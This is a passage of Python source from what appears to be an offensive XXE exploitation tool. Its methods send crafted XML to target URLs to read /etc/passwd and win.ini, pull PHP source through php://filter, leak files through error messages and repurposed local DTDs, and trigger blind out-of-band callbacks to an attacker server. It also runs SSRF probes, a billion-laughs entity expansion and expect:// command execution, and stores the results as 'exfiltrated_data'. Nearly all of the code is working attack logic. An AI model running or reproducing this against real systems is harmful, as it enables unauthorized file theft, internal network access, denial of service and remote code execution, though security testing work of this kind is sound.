                    detected2, ev2, conf2 = self.analyzer.analyze(decoded)
                    if detected2:
                        found.append(XXEVulnerability(
                            url=url,
                            technique=XXETechnique.PHP_FILTER,
                            context=XXEContext.XML_BODY,
                            payload=payload,
                            confidence=conf2,
                            exploitable=True,
                            exfiltrated_data=decoded[:3000],
                            metadata={"file": file_path, "evidence_type": ev2, "content_type": content_type},
                        ))
                        break

            if detected:
                found.append(XXEVulnerability(
                    url=url,
                    technique=XXETechnique.CLASSIC_INBAND,
                    context=XXEContext.XML_BODY,
                    payload=payload,
                    confidence=confidence,
                    exploitable=True,
                    exfiltrated_data=resp.text[:3000],
                    metadata={"file": file_path, "evidence_type": evidence_type, "content_type": content_type},
                ))
                break

        return found

    def _test_php_filter(
        self, url: str, content_type: str = "application/xml"
    ) -> Optional[XXEVulnerability]:
        for target in self.builder.PHP_TARGETS:
            for builder_method in [self.builder.php_filter_b64, self.builder.php_filter_chain]:
                payload = builder_method(target)
                resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
                if not resp:
                    continue
                decoded = self.analyzer.extract_base64(resp.text)
                if decoded and "<?php" in decoded:
                    return XXEVulnerability(
                        url=url,
                        technique=XXETechnique.PHP_FILTER,
                        context=XXEContext.XML_BODY,
                        payload=payload,
                        confidence=0.99,
                        exploitable=True,
                        exfiltrated_data=decoded[:5000],
                        metadata={"file": target, "evidence_type": "php_source", "content_type": content_type},
                    )
        return None

    def _test_error_based(
        self, url: str, content_type: str = "application/xml"
    ) -> Optional[XXEVulnerability]:
        marker = f"EREBUS{self.oob.new_token()}"
        test_files = ["/etc/passwd", "C:/Windows/win.ini", "/etc/hostname"]

        for file_path in test_files:
            for build_fn in [self.builder.error_based, self.builder.error_based_netdoc]:
                try:
                    payload = build_fn(file_path, marker) if build_fn == self.builder.error_based else build_fn(file_path)
                except TypeError:
                    payload = build_fn(file_path, marker)

                resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
                if not resp:
                    continue

                # Error message reveals our crafted path with the marker
                if marker in resp.text:
                    return XXEVulnerability(
                        url=url,
                        technique=XXETechnique.ERROR_BASED,
                        context=XXEContext.XML_BODY,
                        payload=payload,
                        confidence=0.88,
                        exploitable=True,
                        exfiltrated_data=resp.text[:2000],
                        metadata={"file": file_path, "marker": marker, "evidence_type": "error_path_leak", "content_type": content_type},
                    )

                detected, evidence_type, confidence = self.analyzer.analyze(resp.text)
                if detected and confidence >= 0.75:
                    return XXEVulnerability(
                        url=url,
                        technique=XXETechnique.ERROR_BASED,
                        context=XXEContext.XML_BODY,
                        payload=payload,
                        confidence=confidence,
                        exploitable=True,
                        exfiltrated_data=resp.text[:2000],
                        metadata={"file": file_path, "evidence_type": evidence_type, "content_type": content_type},
                    )

        return None

    def _test_blind_oob(
        self, url: str, content_type: str = "application/xml"
    ) -> Optional[XXEVulnerability]:
        """
        Blind OOB probe. Only reports when the response diverges from a benign
        baseline — indicating the parser attempted to resolve the external entity.
        Operator must confirm via attacker-server callback logs.
        """
        token = self.oob.new_token("blind_probe")

        baseline_resp = self.http.post(
            url, data=self.builder.benign(), headers={"Content-Type": content_type}
        )
        if not baseline_resp or baseline_resp.status_code in (404, 415, 405):
            return None
        baseline_text = baseline_resp.text
        baseline_status = baseline_resp.status_code

        for payload_fn in [self.builder.blind_oob_dtd_fetch, self.builder.blind_oob_direct]:
            payload = payload_fn(token)
            resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
            if not resp or resp.status_code in (404, 415, 405):
                continue

            divergence = self.analyzer.compare_responses(baseline_text, resp.text)
            status_changed = resp.status_code != baseline_status

            if divergence > 0.20 or status_changed:
                return XXEVulnerability(
                    url=url,
                    technique=XXETechnique.BLIND_OOB_HTTP,
                    context=XXEContext.XML_BODY,
                    payload=payload,
                    confidence=0.40,
                    exploitable=False,
                    metadata={
                        "token": token,
                        "dtd_url": self.oob.get_dtd_url(token),
                        "callback_url": self.oob.get_callback_url(token),
                        "note": "Check attacker server for incoming HTTP requests to confirm",
                        "divergence": divergence,
                        "content_type": content_type,
                    },
                )

        return None

    def _test_ssrf(
        self, url: str, content_type: str = "application/xml", baseline: str = ""
    ) -> Optional[XXEVulnerability]:
        for target in self.builder.SSRF_TARGETS:
            payload = self.builder.ssrf(target)
            resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
            if not resp:
                continue

            success, service = self.analyzer.analyze_ssrf_response(resp.text)
            if success:
                return XXEVulnerability(
                    url=url,
                    technique=XXETechnique.SSRF,
                    context=XXEContext.XML_BODY,
                    payload=payload,
                    confidence=0.95,
                    exploitable=True,
                    ssrf_target=target,
                    exfiltrated_data=resp.text[:2000],
                    metadata={"ssrf_target": target, "service": service, "content_type": content_type},
                )

            # Blind SSRF: require both high relative divergence and minimum absolute diff
            # to avoid false positives from dynamic page content.
            if baseline:
                divergence = self.analyzer.compare_responses(baseline, resp.text)
                abs_diff = abs(len(resp.text) - len(baseline))
                if divergence > 0.50 and abs_diff > 200:
                    return XXEVulnerability(
                        url=url,
                        technique=XXETechnique.SSRF,
                        context=XXEContext.XML_BODY,
                        payload=payload,
                        confidence=0.45,
                        exploitable=False,
                        ssrf_target=target,
                        metadata={
                            "ssrf_target": target,
                            "divergence": divergence,
                            "abs_diff": abs_diff,
                            "note": "Response diverged from baseline — possible blind SSRF, verify manually",
                            "content_type": content_type,
                        },
                    )

        return None

    def _test_soap(self, url: str) -> Optional[XXEVulnerability]:
        for ct in self.SOAP_CONTENT_TYPES:
            for file_path in ["/etc/passwd", "C:/Windows/win.ini"]:
                payload = self.builder.soap_classic(file_path)
                resp = self.http.post(url, data=payload, headers={
                    "Content-Type": ct,
                    "SOAPAction": '""',
                })
                if not resp:
                    continue

                detected, evidence_type, confidence = self.analyzer.analyze(resp.text)
                if detected:
                    return XXEVulnerability(
                        url=url,
                        technique=XXETechnique.SOAP,
                        context=XXEContext.SOAP,
                        payload=payload,
                        confidence=confidence,
                        exploitable=True,
                        exfiltrated_data=resp.text[:2000],
                        metadata={"file": file_path, "evidence_type": evidence_type, "content_type": ct},
                    )

        return None

    def _test_local_dtd(
        self, url: str, content_type: str = "application/xml"
    ) -> Optional[XXEVulnerability]:
        """
        Repurpose known local DTDs to exfiltrate files without external connectivity.
        Probes each known DTD path, then attempts entity redefinition for error-based leak.
        """
        for dtd_name, (dtd_path, entity_name) in self.builder.LOCAL_DTDS.items():
            probe_payload = self.builder.ssrf(f"file://{dtd_path}")
            probe_resp = self.http.post(url, data=probe_payload, headers={"Content-Type": content_type})
            if not probe_resp or not probe_resp.text.strip():
                continue

            for file_path in ["/etc/passwd", "/etc/hostname"]:
                payload = self.builder.local_dtd_error(dtd_path, entity_name, file_path)
                resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
                if not resp:
                    continue

                detected, evidence_type, confidence = self.analyzer.analyze(resp.text)
                if detected:
                    return XXEVulnerability(
                        url=url,
                        technique=XXETechnique.LOCAL_DTD,
                        context=XXEContext.XML_BODY,
                        payload=payload,
                        confidence=confidence,
                        exploitable=True,
                        exfiltrated_data=resp.text[:2000],
                        metadata={
                            "dtd_path": dtd_path,
                            "dtd_name": dtd_name,
                            "file": file_path,
                            "evidence_type": evidence_type,
                            "content_type": content_type,
                        },
                    )

        return None

    def _test_billion_laughs(
        self, url: str, content_type: str = "application/xml"
    ) -> Optional[XXEVulnerability]:
        """
        Confirm the attack surface exists by triggering entity expansion.
        A notable delay or error confirms the XML parser follows entities.
        """
        baseline_times = []
        benign_payload = self.builder.benign()
        for _ in range(3):
            start = time.time()
            self.http.post(url, data=benign_payload, headers={"Content-Type": content_type})
            baseline_times.append(time.time() - start)
        baseline_avg = statistics.mean(baseline_times)

        payload = self.builder.billion_laughs(depth=5)
        start = time.time()
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        elapsed = time.time() - start

        if not resp:
            return None

        delay_sig = elapsed > baseline_avg + 2.0
        error_sig = resp.status_code in (500, 503, 508)

        if delay_sig or error_sig:
            return XXEVulnerability(
                url=url,
                technique=XXETechnique.BILLION_LAUGHS,
                context=XXEContext.XML_BODY,
                payload=payload,
                confidence=0.72,
                exploitable=False,
                metadata={
                    "baseline_time": baseline_avg,
                    "expansion_time": elapsed,
                    "status_code": resp.status_code,
                    "note": "Entity expansion delay confirmed — XML parser processes external entities",
                    "content_type": content_type,
                },
            )

        return None

    def _test_expect_rce(
        self, url: str, content_type: str = "application/xml"
    ) -> Optional[XXEVulnerability]:
        """PHP expect:// — RCE if expect module is loaded (rare but devastating)."""
        payload = self.builder.expect_rce("id")
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        if resp and re.search(r'uid=\d+\(\w+\)\s+gid=\d+', resp.text):
            return XXEVulnerability(
                url=url,
                technique=XXETechnique.EXPECT_RCE,
                context=XXEContext.XML_BODY,
                payload=payload,
                confidence=0.99,
                exploitable=True,
                exfiltrated_data=resp.text[:500],
                metadata={"command": "id", "note": "PHP expect:// enabled — direct RCE", "content_type": content_type},
            )
        return None


    def _read_file(self, url: str, file_path: str, content_type: str) -> Optional[str]:
        payload = self.builder.classic(file_path)
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        if resp:
            detected, _, _ = self.analyzer.analyze(resp.text)
            if detected:
                return resp.text
        return None

    def _read_file_php(self, url: str, file_path: str, content_type: str) -> Optional[str]:
        payload = self.builder.php_filter_b64(file_path)
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        if resp:
            return self.analyzer.extract_base64(resp.text)
        return None

    def _read_file_soap(self, url: str, file_path: str) -> Optional[str]:
        payload = self.builder.soap_classic(file_path)
        resp = self.http.post(url, data=payload, headers={
            "Content-Type": "application/soap+xml; charset=utf-8",
            "SOAPAction": '""',
        })
        if resp:
            detected, _, _ = self.analyzer.analyze(resp.text)
            if detected:
                return resp.text
        return None

    def _read_file_error(self, url: str, file_path: str, content_type: str, marker: str) -> Optional[str]:
        payload = self.builder.error_based(file_path, marker)
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        if resp and marker in resp.text:
            return resp.text
        return None

    def _fetch_ssrf(self, url: str, target_url: str, content_type: str) -> Optional[str]:
        payload = self.builder.ssrf(target_url)
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        return resp.text if resp else None
